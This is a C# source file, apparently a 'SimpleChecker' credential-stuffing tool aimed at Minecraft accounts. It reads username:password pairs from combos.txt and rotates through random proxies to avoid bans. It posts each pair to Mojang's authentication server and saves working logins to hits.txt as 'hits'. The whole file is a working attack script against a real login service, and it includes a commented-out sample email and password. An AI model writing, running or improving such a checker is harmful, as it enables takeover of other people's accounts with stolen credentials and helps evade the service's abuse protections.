using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;
using System.IO;
using System;
using System.Runtime.InteropServices;
using System.Net;
namespace SimpleChecker
{
    public class Request
    {
        protected List<string> proxyList = new List<string>();
        protected List<string> combos = new List<string>();

        public Request(List<string> proxies)
        {
            this.proxyList = proxies;
        }
        public string GrabProxie()
        {
            Random r = new Random();
            int index = r.Next(0,proxyList.Count - 1); //keep it in bounds
            string myproxy = proxyList[index];
            return myproxy;
        }

        public void GrabUserandPassword()
        //extract a line from the combos.txt
        {
            string line;
            using(StreamReader sr = new StreamReader("combos.txt"))
            {
                while((line = sr.ReadLine()) != null)
                {
                    string[] proxyandport = GrabProxie().Split(":");
                    string proxy = proxyandport[0];
                    string port = proxyandport[1];
                    string[] combo = line.Split(":");
                    Post(proxy, port,combo[0],combo[1]);
                }
            }
        }
        public void Post(string proxy, string port, string name, string pwd)
        {
            Console.ReadKey();
            try
            {
                //open connection
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://authserver.mojang.com/authenticate");
                request.Method = "POST";
                request.Proxy = new WebProxy(proxy,int.Parse(port)); //connect through random proxy
                request.Timeout = 50; //set proxy alive time


                //set payload
                // name = "mijaj50792@ualmail.com";
                // pwd = "Thisisatest"; //Thisisatest
                string json = "{\"agent\": {\"name\": \"Minecraft\",\"version\": 1},\"username\":\"" +name +"\",\"password\":\""+ pwd+"\",\"requestUser\": true}";
                // turn our request string into a byte stream
                byte[] postBytes = Encoding.UTF8.GetBytes(json);
                request.ContentLength = postBytes.Length; //setting container size

                Stream requestStream = request.GetRequestStream();

                //send request - closing the stream sends the request
                requestStream.Write(postBytes, 0, postBytes.Length); // add payload(json) to body of the previously opened connection
                requestStream.Close();

                //read response
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                string result;
                using (StreamReader rdr = new StreamReader(response.GetResponseStream()))
                {
                    result = rdr.ReadToEnd();
                }
                Console.ForegroundColor  = ConsoleColor.Green;
                Console.WriteLine("[Hit!]\t\t"+ proxy+":"+port+"\t"+name+":"+pwd);
                using(StreamWriter file = File.AppendText("hits.txt"))
                {
                    file.WriteLine(name+":"+pwd); // apend to hits.txtt
                }

            }
            catch(Exception e)//if the remote server return an unauth response
            {
                Console.WriteLine(e);
                Console.ForegroundColor  = ConsoleColor.Red; // bad proxie (blanket banned)
                if (e.ToString().Contains("timed out"))
                {
                    Console.WriteLine(e);
                    Console.ReadKey();
                    Console.WriteLine("---[Proxy Timeout(5s)]---");
                    Console.WriteLine("   "+proxy+":"+port);
                    int removal = proxyList.IndexOf(proxy);
                    proxyList.RemoveAt(removal);
                    Console.WriteLine("---[  Removed Proxy  ]---");
                }else if(e.ToString().Contains("Forbidden")) // bad account
                {
                    int removal = combos.IndexOf(name+":"+pwd);
                    combos.RemoveAt(removal);
                    Console.WriteLine("[Invalid!]\t" + proxy+":"+port+"\t"+name+":"+pwd);
                }
                GrabUserandPassword();
            }
        }
    }
}